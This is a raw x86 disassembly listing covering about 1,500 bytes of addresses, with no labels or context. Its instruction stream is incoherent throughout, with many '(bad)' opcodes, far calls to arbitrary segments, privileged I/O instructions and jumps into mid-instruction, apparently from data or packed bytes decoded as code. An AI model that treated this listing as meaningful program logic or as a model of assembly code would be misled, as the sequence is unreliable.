  43bf0a:	sub    al,0x83
  43bf0c:	sahf   
  43bf0d:	mov    DWORD PTR [ebp+0x1a060198],eax
  43bf13:	sar    bl,0xff
  43bf16:	jecxz  0x43bf05
  43bf18:	push   eax
  43bf19:	test   al,0x94
  43bf1b:	push   0x47323326
  43bf20:	sahf   
  43bf21:	sub    al,0x2c
  43bf23:	rcr    DWORD PTR [ecx+0x8],1
  43bf26:	rol    DWORD PTR [eax-0x56],cl
  43bf29:	sbb    eax,0xeb1b5169
  43bf2e:	retf   
  43bf2f:	pop    ebx
  43bf30:	dec    eax
  43bf31:	sbb    ebx,DWORD PTR [edx-0x15155490]
  43bf37:	pop    edi
  43bf38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bf39:	inc    edi
  43bf3a:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  43bf3c:	scas   eax,DWORD PTR es:[edi]
  43bf3d:	push   0x32
  43bf3f:	aam    0xaa
  43bf41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bf42:	xor    BYTE PTR [ebp+ebp*4+0x5ee82bc3],ah
  43bf49:	mov    edi,DWORD PTR [edi+ebp*8-0x345c604e]
  43bf50:	and    dh,BYTE PTR [ebx-0x63]
  43bf53:	mov    ds:0xe999edbb,eax
  43bf58:	(bad)  
  43bf59:	retf   
  43bf5a:	push   ecx
  43bf5b:	lock clc 
  43bf5d:	fistp  DWORD PTR [edx-0x5bc5d471]
  43bf63:	adc    al,0xb8
  43bf65:	mov    edi,0xa678a79c
  43bf6a:	ins    BYTE PTR es:[edi],dx
  43bf6b:	inc    edi
  43bf6c:	fs nop
  43bf6e:	xchg   ebp,eax
  43bf6f:	cmc    
  43bf70:	jmp    0xfe60:0xb2de91d0
  43bf77:	xchg   edx,eax
  43bf78:	das    
  43bf79:	xchg   edi,eax
  43bf7a:	pusha  
  43bf7b:	dec    ecx
  43bf7c:	jecxz  0x43bfae
  43bf7e:	pushf  
  43bf7f:	jb     0x43bf33
  43bf81:	repz jp 0x43bfaa
  43bf84:	icebp  
  43bf85:	pushf  
  43bf86:	cli    
  43bf87:	ss retf 0x74d6
  43bf8b:	sbb    eax,0xf7b7b4b2
  43bf90:	mov    al,0x71
  43bf92:	es xor eax,0x8ed60b12
  43bf98:	dec    esp
  43bf99:	aas    
  43bf9a:	test   al,0x38
  43bf9c:	dec    eax
  43bf9d:	xor    bl,BYTE PTR [edx+0x67794149]
  43bfa3:	xor    ebx,DWORD PTR [ebx+0x21]
  43bfa6:	dec    esi
  43bfa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bfa8:	fsubr  QWORD PTR [esi-0x63d1f0a9]
  43bfae:	mov    eax,ds:0x344db25e
  43bfb3:	clc    
  43bfb4:	in     eax,0x4a
  43bfb6:	pop    ebp
  43bfb7:	inc    ecx
  43bfb8:	addr16 or esi,edx
  43bfbb:	pop    ecx
  43bfbc:	call   0x99bf:0x21481899
  43bfc3:	sub    eax,0x29dda08f
  43bfc8:	or     al,0x93
  43bfca:	or     eax,0x5e0b0471
  43bfcf:	xchg   edi,eax
  43bfd0:	sub    al,0xc6
  43bfd2:	ret    
  43bfd3:	pop    esi
  43bfd4:	jo     0x43bf5e
  43bfd6:	mov    ds:0xf0b41c47,al
  43bfdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bfdc:	test   BYTE PTR [ecx+0x1fb3fa47],0x3e
  43bfe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bfe4:	shl    BYTE PTR [ebp+esi*4+0x4d],0x4e
  43bfe9:	pusha  
  43bfea:	mov    dl,0x89
  43bfec:	xchg   esp,eax
  43bfed:	aas    
  43bfee:	les    ecx,FWORD PTR [bp+di-0x6276]
  43bff3:	jbe    0x43bfff
  43bff5:	jbe    0x43c05b
  43bff7:	nop
  43bff8:	dec    esi
  43bff9:	xor    BYTE PTR [eax-0x65adba61],0x6a
  43c000:	mov    ch,cl
  43c002:	das    
  43c003:	push   edi
  43c004:	jecxz  0x43bf9d
  43c006:	call   0x105c:0xa7730039
  43c00d:	push   0xffffff8c
  43c00f:	cdq    
  43c010:	and    esi,DWORD PTR [edx+edx*2+0x21]
  43c014:	mov    dl,0xc9
  43c016:	mov    esp,0xcb3e2b37
  43c01b:	aam    0xb2
  43c01d:	scas   eax,DWORD PTR es:[edi]
  43c01e:	cmp    BYTE PTR [esi+0x3268023d],dh
  43c024:	sbb    cl,BYTE PTR [ebx]
  43c026:	rol    DWORD PTR [ebx+eiz*1+0x60],0x85
  43c02b:	adc    DWORD PTR [edi+0x446a9a9c],ebp
  43c031:	xchg   edx,eax
  43c032:	out    dx,al
  43c033:	stos   BYTE PTR es:[edi],al
  43c034:	les    eax,FWORD PTR [ebx+0x25da4961]
  43c03a:	fisub  DWORD PTR [ecx]
  43c03c:	xchg   BYTE PTR [esi],cl
  43c03e:	mov    bl,0x38
  43c040:	or     ecx,DWORD PTR [ebx]
  43c042:	and    al,0xc1
  43c044:	lahf   
  43c045:	ds in  al,dx
  43c047:	sub    BYTE PTR [ebp-0x77488a65],0xb
  43c04e:	dec    ebx
  43c04f:	mov    al,ds:0x435855f0
  43c054:	ret    0x220b
  43c057:	and    dh,BYTE PTR [edi+0x67]
  43c05a:	loop   0x43c0d9
  43c05c:	sub    BYTE PTR [edx+ebx*4+0x4438e696],bl
  43c063:	loope  0x43c07c
  43c065:	je     0x43c07d
  43c067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c068:	je     0x43c0d4
  43c06a:	cwde   
  43c06b:	test   eax,0x75f697bf
  43c070:	int3   
  43c071:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c072:	call   0x9631:0x43ca67fa
  43c079:	lock pusha 
  43c07b:	mov    ebx,0xd7b08cb7
  43c080:	jle    0x43c008
  43c082:	test   DWORD PTR [ebx-0x4e],ebx
  43c085:	sub    DWORD PTR [ebp+0x7c],edx
  43c088:	add    bh,ch
  43c08a:	and    edi,DWORD PTR [edx-0x4d34f46c]
  43c090:	push   0xc6cf3ba8
  43c095:	rcr    BYTE PTR [ebx-0x7a7bcfa4],cl
  43c09b:	or     BYTE PTR [ebp+0x47],dh
  43c09e:	data16 cmp al,0xe6
  43c0a1:	add    eax,0xe550aa50
  43c0a6:	fiadd  DWORD PTR [eax+0x24e738fa]
  43c0ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c0ad:	sbb    eax,0x230ec3e9
  43c0b2:	in     al,0xc7
  43c0b4:	shr    DWORD PTR [ecx],cl
  43c0b6:	push   ebx
  43c0b7:	scas   al,BYTE PTR es:[edi]
  43c0b8:	xchg   esi,eax
  43c0b9:	push   esi
  43c0ba:	call   0xa563:0xb94a72c4
  43c0c1:	mov    ds:0xd94e9e2e,eax
  43c0c6:	sbb    eax,0x472b309d
  43c0cb:	aaa    
  43c0cc:	imul   ecx,DWORD PTR [edx],0x4b
  43c0cf:	jl     0x43c083
  43c0d1:	cmp    cl,0x8
  43c0d4:	push   ecx
  43c0d5:	jno    0x43c0f1
  43c0d7:	cld    
  43c0d8:	dec    esi
  43c0d9:	or     BYTE PTR [ecx],bl
  43c0db:	push   edi
  43c0dc:	mov    ecx,0x62f3baf0
  43c0e1:	lods   al,BYTE PTR ds:[esi]
  43c0e2:	or     DWORD PTR [eax-0x53],eax
  43c0e5:	and    eax,0x5724796
  43c0ea:	push   es
  43c0eb:	(bad)  
  43c0ec:	loopne 0x43c098
  43c0ee:	xor    eax,0x877b03a7
  43c0f3:	xor    al,BYTE PTR ds:0xb2e244ae
  43c0f9:	sub    cl,BYTE PTR [edi+0x3]
  43c0fc:	inc    edi
  43c0fd:	shl    bl,0xc7
  43c100:	inc    esi
  43c101:	add    BYTE PTR [edi-0x1237d4f4],bl
  43c107:	daa    
  43c108:	call   0xf607ea09
  43c10d:	jge    0x43c0e5
  43c10f:	call   0xcda7:0x589ab407
  43c116:	pusha  
  43c117:	jbe    0x43c0f0
  43c119:	inc    ebp
  43c11a:	mov    WORD PTR [edx],es
  43c11c:	outs   dx,BYTE PTR ds:[esi]
  43c11d:	jmp    0x43c0f9
  43c11f:	jno    0x47618b61
  43c125:	or     al,BYTE PTR [ebx+0x62]
  43c128:	push   edi
  43c129:	mov    eax,esp
  43c12b:	(bad)  
  43c12c:	clc    
  43c12d:	jecxz  0x43c183
  43c12f:	mov    ah,0xb2
  43c131:	out    0x91,al
  43c133:	fldcw  WORD PTR [edx+ebp*4+0xb01c815]
  43c13a:	cmp    DWORD PTR [edx-0x4c4e480a],edx
  43c140:	pushf  
  43c141:	out    dx,al
  43c142:	call   0xd22d:0xb52259eb
  43c149:	in     eax,dx
  43c14a:	push   es
  43c14b:	xor    dl,0x3d
  43c14e:	into   
  43c14f:	lods   eax,DWORD PTR ds:[esi]
  43c150:	mov    dl,0x51
  43c152:	mov    fs,WORD PTR [edx]
  43c154:	enter  0xd24c,0xa7
  43c158:	sar    DWORD PTR [edi],1
  43c15a:	xchg   esp,eax
  43c15b:	push   edx
  43c15c:	mov    ch,0x6
  43c15e:	ds retf 0x2bb0
  43c162:	repnz xor al,0x68
  43c165:	add    DWORD PTR [eax-0x26219a99],0xffffffa7
  43c16c:	pushf  
  43c16d:	add    bl,0x0
  43c170:	pop    eax
  43c171:	sub    BYTE PTR [eax+0x69],bh
  43c174:	mov    ch,0xfc
  43c176:	ss cdq 
  43c178:	daa    
  43c179:	aaa    
  43c17a:	mov    edx,0x1e2baf14
  43c17f:	scas   al,BYTE PTR es:[edi]
  43c180:	mov    bl,0x76
  43c182:	shr    DWORD PTR [ebx+0x7191d6b2],0xe8
  43c189:	(bad)  
  43c18a:	call   0x6762:0xebb6ce0e
  43c191:	push   cs
  43c192:	loopne 0x43c134
  43c194:	mov    ch,0x40
  43c196:	inc    ebx
  43c197:	mov    eax,ds:0xcd17fac9
  43c19c:	fsubr  st(7),st
  43c19e:	repnz push 0xa9cfcba1
  43c1a4:	mov    dl,0xd4
  43c1a6:	adc    BYTE PTR [ebx+0x3a],ch
  43c1a9:	pop    ecx
  43c1aa:	shl    BYTE PTR [edi+0x167c61a3],cl
  43c1b0:	scas   eax,DWORD PTR es:[edi]
  43c1b1:	push   ecx
  43c1b2:	adc    al,0x91
  43c1b4:	mov    dl,0xdd
  43c1b6:	jno    0x43c1b7
  43c1b8:	mov    esi,0xb9f6b2ca
  43c1bd:	jle    0x43c13f
  43c1bf:	pushf  
  43c1c0:	popa   
  43c1c1:	jnp    0x43c157
  43c1c3:	cdq    
  43c1c4:	and    ebp,DWORD PTR [eax-0x6]
  43c1c7:	pop    ds
  43c1c8:	js     0x43c234
  43c1ca:	jb     0x43c243
  43c1cc:	(bad)  
  43c1cd:	das    
  43c1ce:	nop
  43c1cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c1d0:	fcmovnb st,st(4)
  43c1d2:	scas   eax,DWORD PTR es:[edi]
  43c1d3:	fadd   QWORD PTR [ecx]
  43c1d5:	pop    edi
  43c1d6:	clc    
  43c1d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c1d8:	cmp    BYTE PTR [edi+ecx*1-0xec26335],bh
  43c1df:	sahf   
  43c1e0:	mov    dl,0x6a
  43c1e2:	pop    ebp
  43c1e3:	jp     0x98ec3fa9
  43c1e9:	or     ecx,esi
  43c1eb:	dec    ebp
  43c1ec:	gs cwde 
  43c1ee:	mov    bh,0x5a
  43c1f0:	icebp  
  43c1f1:	or     BYTE PTR [edx+0x41458bdd],bl
  43c1f7:	pushf  
  43c1f8:	adc    al,0x3f
  43c1fa:	xchg   ecx,eax
  43c1fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c1fc:	adc    DWORD PTR [edi-0x6a],eax
  43c1ff:	mul    BYTE PTR [esi-0x4d]
  43c202:	fcom   QWORD PTR [eax-0x72]
  43c205:	pop    edi
  43c206:	mov    ebx,0xd066c8a7
  43c20b:	cli    
  43c20c:	loope  0x43c20d
  43c20e:	mov    BYTE PTR [edi+0x40bebe4a],ah
  43c214:	inc    edx
  43c215:	addr16 int3 
  43c217:	mov    dl,0xc7
  43c219:	out    0x9a,eax
  43c21b:	adc    al,0xf
  43c21d:	(bad)  [esi]
  43c21f:	and    al,0x1e
  43c221:	js     0x43c245
  43c223:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c224:	sbb    DWORD PTR [edx],edi
  43c226:	sbb    eax,0x11ae5951
  43c22b:	addr16 mov dl,0x3c
  43c22e:	jg     0x43c208
  43c230:	sub    eax,0xdeb61613
  43c235:	add    eax,0x66bf7bc9
  43c23a:	push   ebp
  43c23b:	(bad)  
  43c23c:	aaa    
  43c23d:	nop
  43c23e:	js     0x43c267
  43c240:	cmp    BYTE PTR [edx-0x2e762f5f],bl
  43c246:	push   es
  43c247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c248:	adc    al,0x11
  43c24a:	add    BYTE PTR [ebx-0x65],dl
  43c24d:	push   ecx
  43c24e:	mul    DWORD PTR [edi+0x2a1576dc]
  43c254:	imul   ebp,DWORD PTR [eax-0x454d9c9d],0x34e07d2c
  43c25e:	and    eax,0xad154745
  43c263:	(bad)  
  43c264:	add    cl,BYTE PTR [ebx+0x2b1eff1e]
  43c26a:	jmp    0x40ed:0xf133b281
  43c271:	push   ecx
  43c272:	xlat   BYTE PTR ds:[ebx]
  43c273:	xchg   esp,eax
  43c274:	push   esp
  43c275:	xor    BYTE PTR [ecx+edi*4],ah
  43c278:	mov    dl,0xff
  43c27a:	hlt    
  43c27b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c27c:	loop   0x43c291
  43c27e:	mov    esi,0x2233b2b7
  43c283:	mov    esi,DWORD PTR [ebp+ebx*8+0x75]
  43c287:	ret    
  43c288:	and    eax,0x405b5605
  43c28d:	neg    dl
  43c28f:	in     eax,0x23
  43c291:	push   ss
  43c292:	pop    edi
  43c293:	inc    ebx
  43c294:	mov    bl,0x23
  43c296:	arpl   WORD PTR [edx-0x79],bp
  43c299:	adc    bp,WORD PTR [eax]
  43c29c:	popa   
  43c29d:	shl    DWORD PTR [esi],cl
  43c29f:	fs jnp 0x43c2cf
  43c2a2:	aam    0x22
  43c2a4:	sbb    al,BYTE PTR [edi]
  43c2a6:	xchg   edi,eax
  43c2a7:	out    0x46,eax
  43c2a9:	mov    ebp,0x937a189a
  43c2ae:	stos   BYTE PTR es:[edi],al
  43c2af:	(bad)  
  43c2b0:	jns    0x43c329
  43c2b2:	in     eax,0xa7
  43c2b4:	dec    ebp
  43c2b5:	or     DWORD PTR [edi-0x4becfa01],esp
  43c2bb:	sahf   
  43c2bc:	mov    bl,0x1a
  43c2be:	les    eax,FWORD PTR [eax-0x570d66cf]
  43c2c4:	shl    BYTE PTR ds:0xeb3aff98,cl
  43c2ca:	call   0x4e88:0x3f770cd0
  43c2d1:	test   al,0xe5
  43c2d3:	sub    eax,0x56e7beb2
  43c2d8:	add    BYTE PTR [di+0x39],cl
  43c2dc:	out    dx,al
  43c2dd:	or     esi,eax
  43c2df:	ret    0x3135
  43c2e2:	xchg   esi,eax
  43c2e3:	pop    DWORD PTR [esi+ebx*4-0x66]
  43c2e7:	sbb    eax,0xf78d29da
  43c2ec:	jg     0x43c33c
  43c2ee:	retf   
  43c2ef:	aam    0x4e
  43c2f1:	inc    ebx
  43c2f2:	xor    DWORD PTR [edi],ebp
  43c2f4:	mov    al,0x1a
  43c2f6:	mov    al,ch
  43c2f8:	out    dx,eax
  43c2f9:	push   es
  43c2fa:	pop    ebx
  43c2fb:	in     al,dx
  43c2fc:	lods   al,BYTE PTR ds:[esi]
  43c2fd:	xlat   BYTE PTR ds:[ebx]
  43c2fe:	xchg   ecx,eax
  43c2ff:	add    dh,BYTE PTR [edx-0x187f7592]
  43c305:	retf   0x53c2
  43c308:	or     BYTE PTR [ebx],cl
  43c30a:	inc    ebx
  43c30b:	xor    BYTE PTR [esi-0x3c],cl
  43c30e:	and    ch,BYTE PTR ds:0x8684091e
  43c314:	cmc    
  43c315:	test   al,0x5d
  43c317:	cmp    ch,dl
  43c319:	jo     0x43c2df
  43c31b:	inc    edi
  43c31c:	dec    esp
  43c31d:	frstor [edi+0x4b0bbdb8]
  43c323:	sbb    eax,0x792f88de
  43c328:	fild   QWORD PTR [edx]
  43c32a:	call   0x3551:0x6096a3df
  43c331:	xchg   DWORD PTR [edi+eiz*4-0x59],esp
  43c335:	pop    edx
  43c336:	and    DWORD PTR [eax+0x767e2f14],edi
  43c33c:	mov    dl,0x8d
  43c33e:	or     eax,DWORD PTR [edx-0x67]
  43c341:	mov    ebx,0x59ae114
  43c346:	fimul  WORD PTR [esi]
  43c348:	and    dl,BYTE PTR [esi-0x1abe9ec6]
  43c34e:	ja     0x43c37e
  43c350:	lods   eax,DWORD PTR ds:[esi]
  43c351:	dec    esi
  43c352:	arpl   WORD PTR [edx-0x4e],sp
  43c355:	cdq    
  43c356:	int3   
  43c357:	cmp    DWORD PTR [eax+edx*1-0x17de6276],edi
  43c35e:	sbb    dh,BYTE PTR [eax+eiz*8+0x61b8f64f]
  43c365:	and    DWORD PTR [edx-0x4982dc24],ebx
  43c36b:	mov    al,ds:0xbb50db99
  43c370:	sub    bl,BYTE PTR [esi]
  43c372:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c373:	daa    
  43c374:	mov    DWORD PTR [eax],ebx
  43c376:	fucom  st(2)
  43c378:	pusha  
  43c379:	inc    esi
  43c37a:	call   0x1595:0x38726f7b
  43c381:	imul   esi,DWORD PTR [ebx-0x60],0xffffffd9
  43c385:	push   eax
  43c386:	repnz lods al,BYTE PTR ds:[esi]
  43c388:	jecxz  0x43c345
  43c38a:	push   edi
  43c38b:	jecxz  0x43c344
  43c38d:	and    bl,BYTE PTR [edx-0x73027b71]
  43c393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c394:	push   esi
  43c395:	jecxz  0x43c3c0
  43c397:	fadd   QWORD PTR [edi-0x2b366ff7]
  43c39d:	adc    al,0x48
  43c39f:	jmp    0x43c413
  43c3a1:	shl    BYTE PTR [edx-0x582a4d6d],0xbf
  43c3a8:	mov    ds:0x90ef72e4,eax
  43c3ad:	or     BYTE PTR [edi],cl
  43c3af:	mov    ebp,0xbcd43bd0
  43c3b4:	pop    ebp
  43c3b5:	dec    ebx
  43c3b6:	lods   eax,DWORD PTR ds:[esi]
  43c3b7:	push   ss
  43c3b8:	sahf   
  43c3b9:	inc    ecx
  43c3ba:	call   0xbe3:0xb099d64b
  43c3c1:	cmp    BYTE PTR [ebp-0x58],ch
  43c3c4:	aas    
  43c3c5:	jmp    0x43c3e6
  43c3c7:	fwait
  43c3c8:	xor    dh,BYTE PTR [esi+0x5c]
  43c3cb:	dec    esi
  43c3cc:	xchg   edi,eax
  43c3cd:	mov    DWORD PTR [edx+0x1a475cc7],ebx
  43c3d3:	test   BYTE PTR [ebx-0x35581e26],cl
  43c3d9:	call   0xbdaa9c0c
  43c3de:	pop    ds
  43c3df:	dec    esi
  43c3e0:	mov    ebp,0xf3622679
  43c3e5:	dec    ebx
  43c3e6:	icebp  
  43c3e7:	or     DWORD PTR [ebp+0x6],0x13f6a7c3
  43c3ee:	nop
  43c3ef:	sub    eax,0x789e8d31
  43c3f4:	or     cl,BYTE PTR [eax]
  43c3f6:	test   DWORD PTR [ebx-0x4ae5c476],ebx
  43c3fc:	pop    ds
  43c3fd:	xchg   ebp,eax
  43c3fe:	and    eax,0x1d0bc01a
  43c403:	call   0x6bd131d7
  43c408:	mov    BYTE PTR [edx-0x7249e37c],bl
  43c40e:	fcmovb st,st(7)
  43c410:	lods   eax,DWORD PTR ds:[esi]
  43c411:	xchg   esi,eax
  43c412:	push   ecx
  43c413:	loop   0x43c3eb
  43c415:	or     esp,DWORD PTR [ebx]
  43c417:	jns    0x43c44f
  43c419:	adc    bl,BYTE PTR [ecx+0xd]
  43c41c:	mov    gs,ecx
  43c41e:	call   0xf926:0x2166316b
  43c425:	daa    
  43c426:	mov    ds,eax
  43c428:	jmp    0x43c435
  43c42a:	je     0x43c428
  43c42c:	arpl   WORD PTR [esi+0x72741fc8],bp
  43c432:	call   0x2a37:0xd33331d8
  43c439:	test   eax,0x32eb9c78
  43c43e:	sbb    DWORD PTR [eax+eax*4+0xa205e73],edi
  43c445:	shr    esp,1
  43c447:	add    al,0xb5
  43c449:	(bad)  
  43c44a:	mov    ah,0x23
  43c44c:	dec    esp
  43c44d:	pop    ds
  43c44e:	fs inc edi
  43c450:	bound  edx,QWORD PTR [ecx-0x67]
  43c453:	xchg   DWORD PTR [edx],edi
  43c455:	or     eax,DWORD PTR [ecx+ebx*4]
  43c458:	ins    DWORD PTR es:[edi],dx
  43c459:	in     al,0x8c
  43c45b:	mov    ds:0x9f9a9d40,al
  43c460:	push   ss
  43c461:	aaa    
  43c462:	jl     0x43c442
  43c464:	mov    ch,0xd5
  43c466:	xor    ah,BYTE PTR [esi+0x6fd31521]
  43c46c:	jno    0x43c405
  43c46e:	aam    0x63
  43c470:	dec    edi
  43c471:	rcr    BYTE PTR [edx-0x73cad2cb],1
  43c477:	popa   
  43c478:	in     al,dx
  43c479:	(bad)  
  43c47a:	and    eax,0x20ccd0a7
  43c47f:	xor    dl,bh
  43c481:	ins    BYTE PTR es:[edi],dx
  43c482:	mov    ecx,0x9a70c1eb
  43c487:	and    al,0xe9
  43c489:	push   ss
  43c48a:	jle    0x43c421
  43c48c:	stos   BYTE PTR es:[edi],al
  43c48d:	mov    dl,0x4b
  43c48f:	mov    ebx,0x6756a94f
  43c494:	outs   dx,DWORD PTR ds:[esi]
  43c495:	arpl   WORD PTR [edx-0x65fef5fc],si
  43c49b:	clc    
  43c49c:	(bad)  
  43c49d:	clc    
  43c49e:	es in  al,dx
  43c4a0:	or     al,0xf2
  43c4a2:	jge    0x43c449
  43c4a4:	bound  edx,QWORD PTR [ebp-0xd]
  43c4a7:	jecxz  0x43c48b
  43c4a9:	sti    
  43c4aa:	in     eax,dx
  43c4ab:	test   BYTE PTR cs:[ebx],0xfe
  43c4af:	mov    cl,0x75
  43c4b1:	daa    
  43c4b2:	hlt    
  43c4b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c4b4:	mov    ebp,0xda043ba0
  43c4b9:	mov    eax,ds:0xc9b94d1c
  43c4be:	sbb    eax,DWORD PTR [edx-0x5bd87dae]
  43c4c4:	outs   dx,DWORD PTR ds:[esi]
  43c4c5:	loopne 0x43c544
  43c4c7:	addr16 xchg esi,eax
  43c4c9:	jp     0x43c47a
  43c4cb:	lahf   
  43c4cc:	sbb    eax,0x90071a52
  43c4d1:	fistp  DWORD PTR [eax+ecx*4+0x3]
  43c4d5:	lea    ebx,[edx+0x11c8fee7]
  43c4db:	jns    0x43c51e
  43c4dd:	or     DWORD PTR [edi],ecx
  43c4df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c4e0:	dec    edx
  43c4e1:	xchg   ebp,eax
  43c4e2:	jecxz  0x43c47f
  43c4e4:	add    ch,BYTE PTR [edi+0x67]
  43c4e7:	repz mov ecx,ss
  43c4ea:	test   DWORD PTR [edi-0x3a04e07f],esp
  43c4f0:	mov    ebp,0xc7a75bce
  43c4f5:	mov    bh,0xe
  43c4f7:	xor    eax,0xc9b794f8
  43c4fc:	mov    dl,0x12
  43c4fe:	jb     0x43c50d
  43c500:	dec    ebx
  43c501:	jnp    0x43c57f
  43c503:	mov    edx,0x9f43042c
  43c508:	cld    
  43c509:	test   BYTE PTR [edx+0x4be2ae2c],bh
  43c50f:	inc    ebp
  43c510:	pushf  
  43c511:	sbb    ah,ch
  43c513:	pop    esp
  43c514:	mov    dl,0xf7
  43c516:	in     eax,dx
  43c517:	xchg   edx,eax
  43c518:	inc    esp
  43c519:	scas   al,BYTE PTR es:[edi]
  43c51a:	sbb    dh,BYTE PTR [ebp-0x58afd8b7]
  43c520:	cmc    
  43c521:	dec    ecx
  43c522:	cdq    
  43c523:	fsub   DWORD PTR [esi+0x418e9d45]
  43c529:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c52a:	xchg   ebp,eax
  43c52b:	std    
  43c52c:	adc    bh,BYTE PTR [edx+0xb1fd51b]
  43c532:	sbb    al,BYTE PTR [esi-0x79]
  43c535:	fstp   QWORD PTR [ecx]
  43c537:	xor    edx,0x40c79acb
  43c53d:	stos   DWORD PTR es:[edi],eax
  43c53e:	sub    cl,ch
  43c540:	int3   
  43c541:	xor    eax,0xa86ea797
  43c546:	push   ebp
  43c547:	aam    0x20
  43c549:	aad    0x26
  43c54b:	pop    eax
  43c54c:	mov    dl,0x59
  43c54e:	push   cs
  43c54f:	push   edx
  43c550:	jmp    0x43c5a2
  43c552:	stc    
  43c553:	mov    cl,0x13
  43c555:	or     DWORD PTR [ebx+0x2],edi
  43c558:	or     ch,BYTE PTR [si]
  43c55b:	repz push ebx
  43c55d:	jecxz  0x43c5c5
  43c55f:	pop    ebx
  43c560:	or     al,0xe
  43c562:	call   0xeb1a:0x555ccd6
  43c569:	js     0x43c56f
  43c56b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c56c:	adc    eax,0x5417a2af
  43c571:	jo     0x43c5cd
  43c573:	mov    al,BYTE PTR cs:[esi+0x77]
  43c577:	daa    
  43c578:	fst    DWORD PTR [esp+ebp*2+0x48]
  43c57c:	scas   al,BYTE PTR es:[edi]
  43c57d:	adc    eax,0x8d5ea7b7
  43c582:	sbb    eax,0xc440718f
  43c587:	adc    al,0xb2
  43c589:	out    0xeb,al
  43c58b:	sbb    cl,dh
  43c58d:	dec    ebx
  43c58e:	pop    edi
  43c58f:	cld    
  43c590:	cmp    dh,BYTE PTR [edx]
  43c592:	in     eax,dx
  43c593:	jmp    0xb875:0x8b357fb2
  43c59a:	sub    cl,BYTE PTR [edx+esi*4]
  43c59d:	lods   eax,DWORD PTR ds:[esi]
  43c59e:	cmp    ebx,ecx
  43c5a0:	sub    ebx,DWORD PTR [esi-0x76]
  43c5a3:	ja     0x43c5c1
  43c5a5:	jno    0x43c590
  43c5a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c5a8:	imul   esp,DWORD PTR fs:0xf0b04796,0xd9e6b253
  43c5b3:	fsubr  QWORD PTR [edx+0x74bedbc5]
  43c5b9:	or     esp,eax
  43c5bb:	push   cs
  43c5bc:	and    al,0xcf
  43c5be:	test   DWORD PTR [ebx+0x51],eax
  43c5c1:	pop    eax
  43c5c2:	xchg   dl,dh
  43c5c4:	(bad)  
  43c5c5:	aad    0xe1
  43c5c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c5c8:	nop
  43c5c9:	jo     0x43c5d2
  43c5cb:	shl    BYTE PTR [edx+0x16],1
  43c5ce:	xchg   edx,eax
  43c5cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c5d0:	push   0x66
  43c5d2:	test   eax,0xc726cf31
  43c5d7:	in     al,0xb0
  43c5d9:	inc    ecx
  43c5da:	sub    DWORD PTR [ebx+0x479f7f03],ecx
  43c5e0:	div    BYTE PTR [ebp-0x56]
  43c5e3:	dec    ebp
  43c5e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c5e5:	jo     0x43c5ba
  43c5e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c5e8:	mov    edi,0x988f5af1
  43c5ed:	cli    
  43c5ee:	xor    dh,cl
  43c5f0:	mov    ch,0x94
  43c5f2:	push   cs
  43c5f3:	lock repnz sub eax,0x31601b8a
  43c5fa:	xchg   ebx,eax
  43c5fb:	pop    ss
  43c5fc:	cmp    edi,ebp
  43c5fe:	lods   eax,DWORD PTR ds:[esi]
  43c5ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c600:	shl    DWORD PTR [ebx+0x5a05a396],cl
  43c606:	into   
  43c607:	das    
  43c608:	mov    dl,0x94
  43c60a:	adc    BYTE PTR ds:0x9d1c45b0,al
  43c610:	loop   0x43c61d
  43c612:	jmp    0x43c5dc
  43c614:	push   eax
  43c615:	scas   eax,DWORD PTR es:[edi]
  43c616:	int3   
  43c617:	mov    bh,bh
  43c619:	add    bl,BYTE PTR [edx-0x26ee8ee7]
  43c61f:	jle    0x43c5ba
  43c621:	ins    BYTE PTR es:[edi],dx
  43c622:	in     eax,0xa7
  43c624:	fisubr DWORD PTR [esi+0x249004fa]
  43c62a:	or     al,0x48
  43c62c:	mov    dl,0x5f
  43c62e:	and    BYTE PTR [eax-0x7e79977b],al
  43c634:	in     al,0x19
  43c636:	lea    esi,[edx+0x5f620b8f]
  43c63c:	sub    eax,0xb2a816e2
  43c641:	add    ebx,DWORD PTR [eax]
  43c643:	xchg   edx,eax
  43c644:	inc    ebx
  43c645:	xor    eax,0xbcc6832
  43c64a:	std    
  43c64b:	xchg   ebx,eax
  43c64c:	jecxz  0x43c5fb
  43c64e:	xchg   esp,eax
  43c64f:	(bad)  
  43c650:	ins    BYTE PTR es:[edi],dx
  43c651:	sbb    DWORD PTR [ebp+0x176dddfe],0x14
  43c658:	adc    ebp,edi
  43c65a:	mov    edx,0x6980737a
  43c65f:	mov    ds:0xdc46d97e,al
  43c664:	bound  edx,QWORD PTR [edi-0x36]
  43c667:	div    DWORD PTR [ecx+0x7a535bfe]
  43c66d:	fwait
  43c66e:	sub    bl,BYTE PTR [ebx]
  43c670:	cmp    eax,0xd8fd9a62
  43c675:	jne    0x43c68f
  43c677:	icebp  
  43c678:	add    ecx,esi
